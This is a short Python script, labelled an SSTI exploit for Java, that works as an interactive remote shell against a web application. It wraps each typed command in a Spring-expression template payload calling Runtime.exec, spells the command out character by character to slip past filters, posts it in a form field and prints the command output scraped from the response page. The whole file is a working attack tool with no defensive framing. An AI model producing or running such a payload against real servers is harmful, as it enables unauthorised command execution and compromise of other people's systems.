#generate ssti exploit for java

import sys

def menu () :
    target = sys.argv[1]

    choice = input("Get [g] or Post [p] ? => ")

    if choice == "g" or choice == "G" :
        getC ()
    elif choice == "p" or choice == "P" :
        while True:
            postC(target)


def getC () :
    print("Soon...")
    

def postC (target) :
    payload = input("$")
    if payload == "exit" :
        import sys
        sys.exit(0)
    comSep = [ord(v) for v in payload]
    iPayload = "*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec("  
    payloadEx = ""
    for v in range(len(comSep)) :
        payloadEx += "T(java.lang.Character).toString({})".format(comSep[v])
        if v == 0 :
            payloadEx += ".concat("    
        elif v != len(comSep) -1 and v > 0:
            payloadEx += ").concat("
    fPayload = ")).getInputStream())}"


    finalPayload = iPayload + payloadEx + fPayload

    commandLine(finalPayload, target) 

def commandLine (finalPayload, target) :
    import requests as r

    response = r.post(target, data={"name":finalPayload})

    if response.status_code == 200 :
        a = response.content.decode("utf-8")
        b = a.split('<h2 class="searched">')
        c = b[1].split('</h2>')
        print(c[0])

    else :
        print("$ Command not found!")

menu()